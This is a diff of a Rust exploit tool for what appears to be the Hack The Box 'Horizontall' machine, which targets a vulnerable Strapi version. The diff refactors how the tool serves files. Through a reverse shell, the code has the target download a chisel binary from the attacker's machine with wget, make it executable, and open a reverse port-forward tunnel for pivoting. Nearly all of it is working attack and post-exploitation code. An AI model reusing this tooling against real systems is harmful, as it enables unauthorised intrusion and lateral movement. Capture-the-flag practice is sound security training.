@@ -14,11 +14,11 @@ use git2;
 use regex::Regex;
 use reqwest;
 use serde::{Deserialize};
-use tokio::sync::oneshot;
-use warp::{Filter};
 
 mod reverse_shell;
 use reverse_shell::ReverseShell;
+mod simple_http_server;
+use simple_http_server::SimpleHTTPServer;
 
 const VULNERABLE_STRAPI_VERSION: &str = "3.0.0-beta.17.4";
 const HORIZONTALL_STRAPI_HOSTNAME: &str = "api-prod.horizontall.htb";
@@ -126,21 +126,22 @@ pub struct Args {
 
     /// Local path to chisel binary for local server
     #[clap(long)]
-    chisel_server_path: String,
+    chisel_server_path: path::PathBuf,
 
     /// Local path to Linux amd64 chisel binary for target
     #[clap(long)]
-    chisel_client_path: String
+    chisel_client_path: path::PathBuf
 }
 
 impl Args {
     pub fn validate(&self) -> Result<(), Box<dyn Error>> {
+
         // Ensure both chisel file paths exist
-        if !path::Path::new(&self.chisel_server_path).exists() {
-            return Err(format!("Chisel server binary at {} doesn't exist", self.chisel_server_path).into())
+        if !self.chisel_server_path.exists() {
+            return Err(format!("Chisel server binary at {} doesn't exist", self.chisel_server_path.to_str().unwrap()).into())
         }
-        if !path::Path::new(&self.chisel_client_path).exists() {
-            return Err(format!("Chisel client binary at {} doesn't exist", self.chisel_client_path).into())
+        if !self.chisel_client_path.exists() {
+            return Err(format!("Chisel client binary at {} doesn't exist", self.chisel_client_path.to_str().unwrap()).into())
         }
 
         Ok(())
@@ -267,33 +268,23 @@ fn parse_flag(s: &str) -> Option<String> {
     }
 }
 
-async fn stage_chisel_client(shell: &mut ReverseShell, path: String, lhost: &net::IpAddr, lport: u16) -> Result<(), Box<dyn Error>> {
-    let tx = serve_static_file(lhost, lport, path).await?;
+async fn stage_chisel_client(shell: &mut ReverseShell, path: path::PathBuf, lhost: &net::IpAddr, lport: u16) -> Result<(), Box<dyn Error>> {
+    let mut http_server = SimpleHTTPServer::new(net::SocketAddr::new(lhost.clone(), lport));
+    http_server.serve(path.parent().unwrap());
 
-    shell.exec(&format!("/usr/bin/wget -q http://{}:{}/chisel", lhost, lport))?;
+    shell.exec(&format!("/usr/bin/wget -q http://{}:{}/{}", lhost, lport, path.file_name().unwrap().to_str().unwrap()))?;
     shell.exec("chmod +x ./chisel")?;
-
     let output = shell.exec("ls -l ./chisel")?;
     if !output.contains("rwxrwxr-x") {
+        http_server.stop();
         return Err("Failed to stage chisel client on target".into());
     }
 
-    tx.send(()).expect("Unable to kill web server");
+    http_server.stop();
     Ok(())
 }
 
-async fn serve_static_file(lhost: &net::IpAddr, lport: u16, file_path: String) -> Result<oneshot::Sender<()>, Box<dyn Error>> {
-    let route = warp::path("chisel").and(warp::fs::file(file_path));
-    let (tx, rx) = oneshot::channel();
-    let (_addr, server) = warp::serve(route)
-        .bind_with_graceful_shutdown(net::SocketAddr::new(lhost.clone(), lport), async {
-            rx.await.ok();
-        });
-    tokio::task::spawn(server);
-    Ok(tx)
-}
-
-fn initiate_reverse_port_forward(shell: &mut ReverseShell, chisel_server_path: &str, lhost: &net::IpAddr, chisel_server_lport: u16, tunnel_lport: u16) -> Result<process::Child, Box<dyn Error>> {
+fn initiate_reverse_port_forward(shell: &mut ReverseShell, chisel_server_path: &path::PathBuf, lhost: &net::IpAddr, chisel_server_lport: u16, tunnel_lport: u16) -> Result<process::Child, Box<dyn Error>> {
     let p = process::Command::new(chisel_server_path)
         .args(["server", "--reverse", "--port", &chisel_server_lport.to_string()])
         .stdin(process::Stdio::null())
